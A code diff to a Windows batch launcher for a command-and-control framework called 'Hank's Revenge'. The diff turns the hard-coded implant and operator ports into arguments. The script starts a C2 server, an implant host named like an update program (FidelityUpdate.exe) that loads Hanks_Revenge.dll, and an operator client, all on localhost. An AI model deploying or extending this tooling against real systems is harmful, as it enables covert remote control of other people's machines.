@@ -17,9 +17,15 @@ setlocal EnableDelayedExpansion
 :: Prerequisites:
 ::   pip install cryptography   (first time only, for TLS cert generation)
 :: ---------------------------------------------------------------------------
+if "%~2"=="" (
+    echo Error: At least 2 arguments required IMPLANT PORT OPERATOR PORT 
+    exit /b 1
+)
 
 set "PROJECT_DIR=%~dp0"
 set BUILD_CONFIG=Debug
+
+
 
 if /i "%1"=="Release" set BUILD_CONFIG=Release
 if /i "%1"=="release" set BUILD_CONFIG=Release
@@ -33,6 +39,11 @@ if not exist "%BUILD_DIR%\FidelityUpdate.exe" (
         set "BUILD_DIR=%PROJECT_DIR%build"
     )
 )
+
+
+
+
+
 set "HOST_EXE=%BUILD_DIR%\FidelityUpdate.exe"
 set "DLL_PATH=%BUILD_DIR%\Hanks_Revenge.dll"
 set "SERVER_KEY=%PROJECT_DIR%server\server.key"
@@ -90,22 +101,22 @@ echo [*] Certificate  : %SERVER_CRT%
 echo.
 
 :: ---- Window 1: C2 server --------------------------------------------------
-echo [*] Starting C2 server (implant port 9001 / operator port 9002)...
-start "Hank's Revenge - C2 Server" cmd /k "cd /d "%PROJECT_DIR%" && python server\server.py"
+echo [*] Starting C2 server (implant port %1 / operator port %2)...
+start "Hank's Revenge - C2 Server" cmd /k "cd /d "%PROJECT_DIR%" && python server\server.py %1 %2"
 
 :: Give the server a moment to bind its ports before the implant connects.
 timeout /t 2 /nobreak >nul
 
 :: ---- Window 2: Implant host -----------------------------------------------
 echo [*] Starting implant host...
-start "Hank's Revenge - Implant Host" cmd /k ""%HOST_EXE%" "%DLL_PATH%" 127.0.0.1 9001"
+start "Hank's Revenge - Implant Host" cmd /k ""%HOST_EXE%" "%DLL_PATH%" 127.0.0.1 %1"
 
 :: Brief pause so the host prints its startup banner before the operator opens.
 timeout /t 1 /nobreak >nul
 
 :: ---- Window 3: Operator client --------------------------------------------
 echo [*] Starting operator client...
-start "Hank's Revenge - Operator" cmd /k "cd /d "%PROJECT_DIR%" && python server\client.py"
+start "Hank's Revenge - Operator" cmd /k "cd /d "%PROJECT_DIR%" && python server\client.py 127.0.0.1 %2"
 
 echo.
 echo  ============================================================
